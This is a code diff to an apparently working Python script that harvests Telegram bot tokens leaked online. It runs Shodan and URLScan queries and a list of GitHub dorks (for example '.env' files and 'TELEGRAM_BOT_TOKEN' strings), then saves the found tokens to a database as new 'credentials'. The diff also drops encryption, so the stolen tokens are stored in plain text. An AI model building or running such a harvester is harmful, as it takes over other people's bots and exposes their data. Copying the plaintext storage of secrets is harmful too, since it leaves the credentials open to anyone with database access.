@@ -98,7 +98,6 @@ async def save_manifest(results, source_name: str, verbose=True):
                 pass
             
             # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
-            encrypted_token = security.encrypt(token)
             
             if existing_id and chat_id:
                 # UPDATE existing record with new chat_id
@@ -130,7 +129,7 @@ async def save_manifest(results, source_name: str, verbose=True):
             else:
                 # INSERT new record
                 data = {
-                    "bot_token": encrypted_token,
+                    "bot_token": token,  # Store in plain text
                     "token_hash": token_hash,
                     "chat_id": chat_id,
                     "source": source_name,
@@ -167,46 +166,7 @@ async def run_scanners():
     await broadcaster_service.send_log("🚀 **Manual Scan Started** (Local Script)")
     print("-------------------------------------------------")
 
-    # 1. URLScan
-    print("\n🔍 [URLScan] Starting Scan...")
-    try:
-        query = "api.telegram.org"
-        print(f"  > Query: {query}")
-        print("  > Note: Deep scanning each result URL for tokens")
-        results = urlscan.search(query)
-        count = await save_manifest(results, "urlscan")
-        print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
-    except Exception as e:
-        print(f"  ❌ URLScan Error: {e}")
-
-    # 2. GitHub
-    print("\n🐱 [GitHub] Starting Scan...")
-    dorks = [
-        "filename:.env api.telegram.org",
-        "path:config api.telegram.org",
-        "\"TELEGRAM_BOT_TOKEN\"",
-        "language:python \"ApplicationBuilder\" \"token\"",
-        "language:python \"Telethon\" \"api_id\"",
-        "filename:config.json \"bot_token\"",
-        "filename:settings.py \"TELEGRAM_TOKEN\"",
-         "\"api.telegram.org\""
-    ]
-    
-    total_gh = 0
-    for i, dork in enumerate(dorks):
-        print(f"  > Dorking: {dork}")
-        try:
-            results = github.search(dork)
-            count = await save_manifest(results, "github")
-            total_gh += count
-            print(f"    Found {len(results)} matches, {count} new.")
-        except Exception as e:
-            print(f"    ❌ Error: {e}")
-        
-        if i < len(dorks) - 1:
-            time.sleep(2) # Respect rate limits slightly
-
-    # 3. Shodan
+    # 1. Shodan
     print("\n🌎 [Shodan] Starting Scan...")
     shodan_queries = [
         "http.html:\"api.telegram.org\"",
@@ -224,6 +184,45 @@ async def run_scanners():
             time.sleep(1)
         except Exception as e:
             print(f"    ❌ Error: {e}")
+
+    # 2. URLScan
+    print("\n🔍 [URLScan] Starting Scan...")
+    try:
+        query = "api.telegram.org"
+        print(f"  > Query: {query}")
+        print("  > Note: Deep scanning each result URL for tokens")
+        results = urlscan.search(query)
+        count = await save_manifest(results, "urlscan")
+        print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
+    except Exception as e:
+        print(f"  ❌ URLScan Error: {e}")
+
+    # 3. GitHub
+    print("\n🐱 [GitHub] Starting Scan...")
+    dorks = [
+        "filename:.env api.telegram.org",
+        "path:config api.telegram.org",
+        "\"TELEGRAM_BOT_TOKEN\"",
+        "language:python \"ApplicationBuilder\" \"token\"",
+        "language:python \"Telethon\" \"api_id\"",
+        "filename:config.json \"bot_token\"",
+        "filename:settings.py \"TELEGRAM_TOKEN\"",
+        "\"api.telegram.org\""
+    ]
+    
+    total_gh = 0
+    for i, dork in enumerate(dorks):
+        print(f"  > Dorking: {dork}")
+        try:
+            results = github.search(dork)
+            count = await save_manifest(results, "github")
+            total_gh += count
+            print(f"    Found {len(results)} matches, {count} new.")
+        except Exception as e:
+            print(f"    ❌ Error: {e}")
+        
+        if i < len(dorks) - 1:
+            time.sleep(2) # Respect rate limits slightly
 
     print("\n-------------------------------------------------")
     print("🏁 Full Scan Complete.")
